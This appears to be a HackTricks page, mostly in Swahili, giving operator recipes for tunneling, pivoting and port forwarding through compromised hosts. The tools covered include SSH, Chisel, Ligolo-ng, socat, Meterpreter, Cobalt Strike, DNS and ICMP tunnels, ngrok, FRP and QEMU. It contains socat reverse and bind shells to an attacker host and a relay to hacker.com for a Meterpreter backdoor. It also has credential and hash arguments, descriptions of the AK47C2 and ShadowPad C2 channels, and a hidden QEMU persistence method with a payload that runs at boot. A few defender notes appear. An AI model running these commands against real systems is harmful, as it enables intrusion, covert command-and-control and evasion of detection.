# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Kidokezo la Nmap

> [!WARNING]
> **ICMP** na **SYN** scans haiwezi kupitishwa kupitia socks proxies, hivyo lazima **disable ping discovery** (`-Pn`) na taja **TCP scans** (`-sT`) ili hili lifanye kazi.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Muunganisho wa grafiki wa SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Fungua Port mpya kwenye SSH Server --> Port nyingine
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Port ya ndani --> Compromised host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Bandari ya ndani --> host iliyotekwa (SSH) --> mahali popote
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Hii ni muhimu kupata reverse shells kutoka kwa hosts za ndani kupitia DMZ hadi host yako:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Unahitaji **root katika vifaa vyote viwili** (kwa sababu utaunda interfaces mpya) na usanidi wa sshd lazima uruhusu root login:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Washa forwarding upande wa Server
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Weka njia mpya upande wa mteja
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Usalama – Terrapin Attack (CVE-2023-48795)**
> Shambulio la downgrade la Terrapin la 2023 linaweza kumruhusu man-in-the-middle kuharibu early SSH handshake na kuingiza data katika **any forwarded channel** ( `-L`, `-R`, `-D` ). Hakikisha mteja na seva zimesasishwa (**OpenSSH ≥ 9.6/LibreSSH 6.7**) au zima wazi algorithimu zilizo hatarishi `chacha20-poly1305@openssh.com` na `*-etm@openssh.com` katika `sshd_config`/`ssh_config` kabla ya kutegemea SSH tunnels.

## SSHUTTLE

Unaweza **tunnel** via **ssh** all the **traffic** to a **subnetwork** through a host.\
Kwa mfano, forwarding all the traffic going to 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Unganisha kwa kutumia private key
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

port ya ndani --> host iliyodukuliwa (session hai) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Njia nyingine:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Fungua port kwenye teamserver inayosikiliza kwenye interfaces zote ambayo inaweza kutumika **kupitisha trafiki kupitia beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> Katika kesi hii, **port imefunguliwa kwenye beacon host**, sio kwenye Team Server na trafiki imetumwa kwa Team Server na kutoka huko kwenda host:port iliyotajwa.
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Kumbuka:

- Beacon's reverse port forward imeundwa ili **tunnel traffic to the Team Server, not for relaying between individual machines**.
- Trafiki inapitia **tunneled within Beacon's C2 traffic**, ikiwa ni pamoja na P2P links.
- **Admin privileges are not required** kuunda reverse port forwards kwenye high ports.

### rPort2Port local

> [!WARNING]
> Katika kesi hii, the **port is opened in the beacon host**, sio kwenye Team Server na **traffic is sent to the Cobalt Strike client** (not to the Team Server) na kutoka huko kwenda host:port iliyotajwa
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Unahitaji kupakia faili ya tunnel ya wavuti: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Unaweza kuipakua kutoka kwenye ukurasa wa releases wa [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Unahitaji kutumia **toleo lilezile kwa client na server**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Upelekaji bandari
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Tumia toleo sawa kwa agent na proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Kufunga na Kusikiliza kwa Agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Kupata Agent's Local Ports
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. Tunnel inaanzishwa kutoka kwa victim.\
socks4 proxy inaundwa kwenye 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot kupitia **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port kupitia socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter kupitia SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Unaweza kupitisha **non-authenticated proxy** kwa kutekeleza mstari huu badala ya ule wa mwisho kwenye console ya mwathirika:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Tengeneza vyeti pande zote mbili: Client na Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Unganisha port ya SSH ya lokali (22) kwa port 443 ya attacker host
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Ni kama toleo la console la PuTTY ( the options are very similar to an ssh client).

As this binary will be executed in the victim and it is an ssh client, we need to open our ssh service and port so we can have a reverse connection. Then, to forward only locally accessible port to a port in our machine:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Unahitaji kuwa local admin (kwa port yoyote)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Unahitaji kuwa na **RDP access kwenye mfumo**.\
Pakua:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Chombo hiki kinatumia `Dynamic Virtual Channels` (`DVC`) kutoka kwenye kipengele cha Remote Desktop Service cha Windows. DVC inawajibika kwa **kupitisha packets kupitia muunganisho wa RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Kwenye kompyuta ya mteja wako, pakia **`SocksOverRDP-Plugin.dll`** kama ifuatavyo:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Sasa tunaweza **kuunganisha** kwenye **victim** kupitia **RDP** kwa kutumia **`mstsc.exe`**, na tunapaswa kupokea **prompt** inayosema kwamba **SocksOverRDP plugin is enabled**, na itasikiliza kwenye **127.0.0.1:1080**.

**Unganisha** kupitia **RDP** na pakia & endesha kwenye mashine ya **victim** binary `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Sasa, thibitisha kwenye mashine yako (attacker) kwamba port 1080 inasikiliza:
```
netstat -antb | findstr 1080
```
Now you can use [**Proxifier**](https://www.proxifier.com/) **kupitisha trafiki kupitia port hiyo.**

## Proxify Programu za GUI za Windows

Unaweza kufanya programu za GUI za Windows zipite kupitia proxy kwa kutumia [**Proxifier**](https://www.proxifier.com/).\
Katika **Profile -> Proxy Servers** ongeza IP na port ya server ya SOCKS.\
Katika **Profile -> Proxification Rules** ongeza jina la programu unayotaka proxify na muunganisho kwa IPs unazotaka proxify.

## Kuepuka proxy ya NTLM

Chombo kilichotajwa hapo awali: **Rpivot**\
**OpenVPN** pia inaweza kuikwepa, kwa kuweka chaguzi hizi kwenye faili ya usanidi:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Inathibitisha dhidi ya proxy na ina-bind port kwa ndani ambayo ime-forwarded kwa external service unayobainisha. Kisha, unaweza kutumia tool unayochagua kupitia port hii.\ Kwa mfano, inaforward port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Sasa, ikiwa utaweka kwa mfano kwenye victim huduma ya **SSH** kusikiliza kwenye port 443, unaweza kuungana nayo kupitia port 2222 ya attacker.\
Pia unaweza kutumia **meterpreter** inayounganisha kwa localhost:443 na attacker anasikiliza kwenye port 2222.

## YARP

A reverse proxy iliyotengenezwa na Microsoft. Unaweza kuipata hapa: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root inahitajika katika pande zote mbili ili kuunda tun adapters na kupitisha data kati yao kwa kutumia DNS queries.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Tunneli itakuwa polepole sana. Unaweza kuunda muunganisho wa SSH ulioshinikizwa kupitia tunneli hii kwa kutumia:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

Inaunda chaneli ya C\&C kupitia DNS. Haitaji root privileges.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **Katika PowerShell**

Unaweza kutumia [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kuendesha mteja wa dnscat2 katika PowerShell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding na dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Badilisha proxychains DNS

Proxychains inakamatisha wito wa `gethostbyname` libc na kutunulia maombi ya DNS ya tcp kupitia socks proxy. Kwa **chaguo-msingi** server ya **DNS** ambayo proxychains inatumia ni **4.2.2.2** (hardcoded). Kuibadilisha, hariri faili: _/usr/lib/proxychains3/proxyresolv_ na badilisha IP. Ikiwa uko katika **Windows environment** unaweza kuweka IP ya **domain controller**.

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Mhusika wa Storm-2603 alitengeneza a **dual-channel C2 ("AK47C2")** inayotumia *tu* trafiki ya nje ya **DNS** na **plain HTTP POST** – itifaki mbili ambazo mara chache huzuia kwenye mitandao ya kampuni.

1. **DNS mode (AK47DNS)**
• Inazalisha SessionID isiyotarajiwa ya herufi 5 (mfano `H4T14`).
• Inaweka mbele `1` kwa *task requests* au `2` kwa *results* na kuunganisha mashamba tofauti (flags, SessionID, jina la kompyuta).
• Kila uwanja umefichwa kwa **XOR** kwa key ya ASCII `VHBD@H`, imekodishwa kwa hex, na kuunganishwa kwa nukta – hatimaye kukamilisha na domain inayodhibitiwa na mshambulizi:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Maombi yanatumia `DnsQuery()` kwa rekodi za **TXT** (na fallback **MG**).
• Wakati majibu yanazidi 0xFF bytes backdoor huwaigawanya data katika vipande vya 63-byte na kuingiza alama:
`s<SessionID>t<TOTAL>p<POS>` ili server ya C2 iweze kuzipanga upya.

2. **HTTP mode (AK47HTTP)**
• Inajenga JSON envelope:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Blob nzima inafichwa kwa XOR-`VHBD@H` → hex → imetumwa kama mwili wa **`POST /`** na header `Content-Type: text/plain`.
• Jibu linafuata uandishi uleule na uwanja `cmd` unatekelezwa kwa `cmd.exe /c <command> 2>&1`.

Blue Team notes
• Tafuta maswali ya **TXT** yasiyo ya kawaida yenye lebo ya kwanza ni hexadecimal ndefu na kila mara yanamalizia kwa domain adimu.
• Key ya XOR isiyobadilika ikifuatiwa na ASCII-hex ni rahisi kugundua kwa YARA: `6?56484244?484` (`VHBD@H` in hex).
• Kwa HTTP, angalia body za POST za text/plain ambazo ni hex safi na maradufu ya mbili bytes.

{{#note}}
Channel nzima inafaa ndani ya **standard RFC-compliant queries** na huweka kila lebo ya sub-domain kuwa chini ya 63 bytes, ikifanya kuwa inayojiweka nyuma (stealthy) katika wengi wa DNS logs.
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Root inahitajika katika pande zote mbili kuunda tun adapters na kutunelisha data kati yao kwa kutumia ICMP echo requests.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Pakua kutoka hapa**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **ni zana ya kuweka huduma kwenye Intaneti kwa amri moja ya terminal.**\
_URI za kufikia ni kama:_ **UID.ngrok.io**

### Usakinishaji

- Unda akaunti: https://ngrok.com/signup
- Pakua client:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Matumizi ya msingi

**Nyaraka:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Pia inawezekana kuongeza authentication na TLS, ikiwa inahitajika._

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Kufichua faili kupitia HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_Inafaa kwa XSS,SSRF,SSTI ..._\
Moja kwa moja kutoka stdout au kwenye kiolesura ya HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling huduma ya HTTP ya ndani
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml mfano rahisi wa usanidi

Inafungua 3 tunnels:

- 2 TCP
- 1 HTTP na kuonyesha faili za statiki kutoka /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Daemon ya Cloudflare `cloudflared` inaweza kuunda tuneli za outbound ambazo zinaonyesha **local TCP/UDP services** bila kuhitaji inbound firewall rules, kwa kutumia edge ya Cloudflare kama kitovu cha kukutana. Hii ni muhimu sana wakati egress firewall inaruhusu tu trafiki ya HTTPS lakini muunganisho wa inbound umekataliwa.

### One-liner ya tuneli ya haraka
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Persistent tunnels na DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Anzisha kiunganishi:
```bash
cloudflared tunnel run mytunnel
```
Kwa sababu trafiki zote kutoka kwenye host hutoka **nje kwa 443**, Cloudflared tunnels ni njia rahisi ya kupita kando ya ingress ACLs au mipaka ya NAT. Fahamu kwamba binary kwa kawaida huendesha kwa cheo kilichoinuliwa – tumia containers au the `--user` flag pale inapowezekana.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) ni reverse-proxy ya Go inayodumishwa kwa uendelevu ambayo inaunga mkono **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**. Kuanzia **v0.53.0 (May 2024)** inaweza kutumika kama **SSH Tunnel Gateway**, hivyo host lengwa inaweza kuanzisha reverse tunnel kwa kutumia tu client ya stock OpenSSH – hakuna binary ya ziada inayohitajika.

### Tuneli ya reverse TCP ya jadi
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Kutumia SSH gateway mpya (hakuna binary ya frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Amri iliyo hapo juu inachapisha bandari ya mwathirika **8080** kama **attacker_ip:9000** bila kusambaza zana zozote za ziada — inafaa kwa living-off-the-land pivoting.

## Mifereji ya siri za VM kwa kutumia QEMU

Mitandao ya user-mode ya QEMU (`-netdev user`) inaunga mkono chaguo linaloitwa `hostfwd` ambalo **linahusisha bandari ya TCP/UDP kwenye *host* na kuisogeza ndani ya *guest***. Wakati *guest* inapoendesha SSH daemon kamili, kanuni ya `hostfwd` inakupa disposable SSH jump box inayekaa kabisa ndani ya VM ya muda — kamili kwa kuficha C2 traffic kutoka kwa EDR kwa sababu shughuli zote haribifu na mafaili zinabaki kwenye diski ya virtual.

### Mstari mfupi
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Amri iliyotajwa hapo juu inaanzisha imaji ya **Tiny Core Linux** (`tc.qcow2`) katika RAM.
• Bandari **2222/tcp** kwenye Windows host inapelekwa kwa uwazi hadi **22/tcp** ndani ya guest.
• Kwa mtazamo wa mshambuliaji, lengo linaonyesha tu bandari 2222; paketi zozote zinazofika zinashughulikiwa na SSH server inayotekelezwa ndani ya VM.

### Kuzindua kimyakimya kupitia VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Running the script with `cscript.exe //B update.vbs` keeps the window hidden.

### Uendelevu ndani ya guest

Because Tiny Core is stateless, attackers usually:

1. Drop payload to `/opt/123.out`
2. Append to `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Add `home/tc` and `opt` to `/opt/filetool.lst` so the payload is packed into `mydata.tgz` on shutdown.

### Kwa nini hili linaepuka kugunduliwa

• Only two unsigned executables (`qemu-system-*.exe`) touch disk; no drivers or services are installed.  
• Security products on the host see **benign loopback traffic** (the actual C2 terminates inside the VM).  
• Memory scanners never analyse the malicious process space because it lives in a different OS.

### Vidokezo kwa watetezi

• Alert on **unexpected QEMU/VirtualBox/KVM binaries** in user-writable paths.  
• Block outbound connections that originate from `qemu-system*.exe`.  
• Hunt for rare listening ports (2222, 10022, …) binding immediately after a QEMU launch.

## IIS/HTTP.sys relay nodes via `HttpAddUrl` (ShadowPad)

Ink Dragon’s ShadowPad IIS module turns every compromised perimeter web server into a dual-purpose **backdoor + relay** by binding covert URL prefixes directly at the HTTP.sys layer:

* **Config defaults** – if the module’s JSON config omits values, it falls back to believable IIS defaults (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). That way benign traffic is answered by IIS with the correct branding.
* **Wildcard interception** – operators supply a semicolon-separated list of URL prefixes (wildcards in host + path). The module calls `HttpAddUrl` for each entry, so HTTP.sys routes matching requests to the malicious handler *before* the request reaches IIS modules.
* **Encrypted first packet** – the first two bytes of the request body carry the seed for a custom 32-bit PRNG. Every subsequent byte is XOR-ed with the generated keystream before protocol parsing:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – the module maintains two lists: “servers” (upstream nodes) and “clients” (downstream implants). Entries are pruned if no heartbeat arrives within ~30 seconds. When both lists are non-empty, it pairs the first healthy server with the first healthy client and simply pipes bytes between their sockets until one side closes.
* **Debug telemetry** – optional logging records source IP, destination IP, and total forwarded bytes for each pairing. Investigators used those breadcrumbs to rebuild the ShadowPad mesh spanning multiple victims.

---

## Zana nyingine za kuangalia

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## Marejeleo

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

